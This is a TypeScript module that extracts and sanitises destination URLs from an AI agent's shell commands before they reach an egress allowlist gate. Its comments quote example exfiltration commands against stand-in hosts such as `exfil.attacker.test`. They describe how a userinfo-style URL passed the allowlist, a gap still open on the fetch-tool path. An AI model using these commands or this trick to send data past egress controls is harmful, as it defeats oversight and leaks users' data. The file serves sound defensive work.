/**
 * The Guardian's destination extractor: what stands between an ACS
 * `raw_command` and AGT's stock egress gate.
 *
 * NOT the gate. `policy/lib/egress.rego` is the gate, `cfg.egress` is its
 * configuration, `egress_destination_not_allowed` is the reason it emits, and
 * every one of those is AGT's, vendored byte-identical and not authored here.
 * This module supplies one of that gate's own declared inputs -- the
 * destination path `["annotations", "egress", "destination"]`, one of the five
 * that `default_destination_paths` declares, which is to say AGT anticipated
 * exactly this seam and published the address for it.
 *
 * WHY EXTRACTION RATHER THAN FORWARDING. `host_of()` has two branches, and
 * both of them answer something for a whole command line. When the string
 * contains "://" it takes everything after the scheme, so a URL bounded by a
 * "/" survives being embedded in a command: measured, `curl
 * https://evil.test/x` answers `evil.test`. That is the case that works, and
 * it is the only one. When the string contains no "://" the second branch
 * returns the command's own leading word -- measured, `echo hi` answers
 * `echo hi` and `ls -la /tmp` answers `ls -la ` -- so a forwarded command
 * line always resolves a destination, and no allowlist pattern matches a
 * command, so every benign shell step would be denied. And when nothing
 * bounds the host on the right, trailing shell text is swallowed into it:
 * `curl https://docs.anthropic.com; ls` answers `docs.anthropic.com; ls`,
 * which turns an allowlisted destination into a denial. Extracting the URL
 * first is what keeps the gate from deciding about strings that are not
 * destinations at all.
 *
 * WHY THE EXTRACTED URL IS NOT HANDED OVER VERBATIM. `host_of()` takes the
 * substring after the scheme, splits it on "/", takes index 0, splits THAT on
 * ":" and takes index 0 again -- so it reads the userinfo of a URL that has one
 * as the host. Measured against the shipped allowlist through a Guardian
 * started from this tree with this stripping removed:
 * `curl https://docs.anthropic.com:pw@exfil.attacker.test/steal` was ALLOWED,
 * because `docs.anthropic.com:pw@exfil.attacker.test` splits at the ":" into
 * `docs.anthropic.com`, which `*.anthropic.com` covers. The credential-free
 * form `https://docs.anthropic.com@exfil.attacker.test/steal` was denied, but
 * for the wrong host: no ":" splits it, so the gate compared the whole
 * `docs.anthropic.com@exfil.attacker.test` against the allowlist and missed.
 * Removing the userinfo makes both resolve to the host the request actually
 * reaches -- measured through the Guardian this file ships in, both deny with
 * `destination exfil.attacker.test not in allowlist`. It also stops the inverse
 * false positive: handed `https://evil.test@docs.anthropic.com/x` verbatim, the
 * gate denies an allowlisted host, and handed the stripped form it does not --
 * measured by evaluating `deny_egress` directly against that allowlist.
 *
 * This is a correction to the string this module CHOOSES to supply, not to the
 * gate. The same misreading is still live on the path that does not come
 * through here: a fetch tool's own `url` argument is the gate's FIRST declared
 * destination path, read by `host_of()` directly with nothing in between, so
 * `WebFetch` of the same colon-bearing URL is still allowed. Closing that would
 * mean editing `policy/lib/egress.rego`, which is AGT's file, held
 * byte-identical by `bun run verify:pin`. It is recorded as a measured
 * limitation instead -- see the runbook section on what this does not catch.
 *
 * WHY IT READS THE PRELIMINARY DOCUMENT ITSELF. A manifest's
 * `annotations.<name>.from` is a liveness precondition, not a projection: the
 * SDK requires the path to resolve (an unresolvable one denies the whole call
 * on runtime_error:path_missing, before this function is called at all) and
 * then hands the dispatcher the entire preliminary policy input rather than
 * the value it resolved. Measured. So the command is read here, from the
 * snapshot, by name.
 */

/**
 * The tool-argument names AGT's own gate already reads a destination out of --
 * `default_destination_paths` in `policy/lib/egress.rego`, minus the
 * annotation path this module writes.
 *
 * When one of them is already a string on the snapshot, this module answers
 * nothing. `destination(rules)` is a COMPLETE Rego rule over every configured
 * path, so two paths resolving to different strings has no single answer:
 * measured, that is `deny runtime_error:policy_invocation_failed` -- a total
 * deny wearing a runtime-error reason, on a call nobody decided about. The
 * tool's own argument is the better evidence anyway: it is what the tool will
 * actually reach for, where a command line is what someone typed.
 *
 * The coupling is a copy, and it is only correct while the gate runs on its
 * defaults: `cfg.egress.destination_paths` replaces `default_destination_paths`
 * outright rather than extending it, so a deployment that sets that key
 * desynchronises this list in whichever direction it moved -- a path it adds is
 * one this module will not stand down for, and a path it drops is one this
 * module stands down for needlessly. The shipped `policy/lib/data.json` sets no
 * such key. A deployment that sets one has to revisit this list.
 */
const ARGUMENTS_AGT_ALREADY_READS = ["url", "endpoint", "host", "domain"] as const;

/**
 * The first absolute http(s) URL in a command line.
 *
 * Scheme-anchored on purpose. A bare-host pattern would match package names,
 * file paths and flag values, and every false positive here becomes a denial
 * of a step nobody meant to govern. The character class ends the match at
 * whitespace and at the shell metacharacters that end a word, so a trailing
 * `; ls` or `| tee` is not swallowed into the host.
 *
 * First match, not every match: the gate takes one destination. A command
 * reaching two hosts has its first examined and the rest unexamined, which is
 * this module's stated miss direction rather than a hidden one.
 */
const DESTINATION_IN_COMMAND = /\bhttps?:\/\/[^\s'"`;|&()<>]+/;

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

/**
 * The same URL with any userinfo removed -- everything between the "://" and
 * the "@" that ends the authority, the "@" included.
 *
 * Bounded by the first "/" after the scheme on purpose, because only an "@"
 * ahead of the path is userinfo. `https://exfil.attacker.test/mail@host` has
 * its "@" inside the path and is returned unchanged; stripping there would
 * rewrite the host out of a URL that never had a credential in it.
 *
 * The LAST "@" in the authority is the delimiter, not the first: a userinfo may
 * itself contain one, and the host is what follows the final "@".
 *
 * Total by construction and by intent -- string in, string out, no throw on any
 * input, including one with no scheme, no authority or nothing after the "@".
 * A URL this cannot make sense of is returned as it arrived, and the gate then
 * decides about that string exactly as it would have without this step.
 */
function withoutUserinfo(url: string): string {
  const schemeEnd = url.indexOf("://");
  if (schemeEnd === -1) return url;
  const afterScheme = url.slice(schemeEnd + "://".length);
  const pathStart = afterScheme.indexOf("/");
  const authority = pathStart === -1 ? afterScheme : afterScheme.slice(0, pathStart);
  const userinfoEnd = authority.lastIndexOf("@");
  if (userinfoEnd === -1) return url;
  return url.slice(0, schemeEnd + "://".length) + afterScheme.slice(userinfoEnd + 1);
}

/**
 * Answers `{destination}` when it finds one, `{}` when it does not. The
 * destination is the matched URL with its userinfo removed, not the matched URL
 * verbatim -- see `withoutUserinfo` and the module header for the measurement
 * that makes the difference a denial rather than an allow.
 *
 * Never a throw and never `null`, and both halves are load-bearing. AGT turns
 * any annotator failure -- thrown or rejected -- into its own
 * `runtime_error:annotation_failed` deny, which lands on EVERY call in the
 * deployment, benign ones included, and reads like a policy decision. And a
 * command with no destination is not a failure: the gate is `undefined` when
 * nothing resolves, and the call falls through to the other gates. So an
 * obfuscated or novel egress form is UNEXAMINED here, not denied -- the
 * failure direction the runbook states plainly, because the demo's shape
 * invites the opposite reading.
 *
 * `name` and `config` are part of the dispatcher contract and are not read:
 * this function is the one annotator this Guardian has, and routing by name is
 * its caller's job.
 */
export function annotateEgressDestination(_name: string, _config: unknown, preliminary: unknown): unknown {
  if (!isPlainObject(preliminary)) return {};
  const snapshot = preliminary.snapshot;
  if (!isPlainObject(snapshot)) return {};
  const toolCall = snapshot.tool_call;
  if (!isPlainObject(toolCall)) return {};

  const args = isPlainObject(toolCall.args) ? toolCall.args : {};
  for (const argument of ARGUMENTS_AGT_ALREADY_READS) {
    if (typeof args[argument] === "string") return {};
  }

  const rawCommand = toolCall.raw_command;
  if (typeof rawCommand !== "string") return {};

  const found = DESTINATION_IN_COMMAND.exec(rawCommand);
  return found === null ? {} : { destination: withoutUserinfo(found[0]) };
}
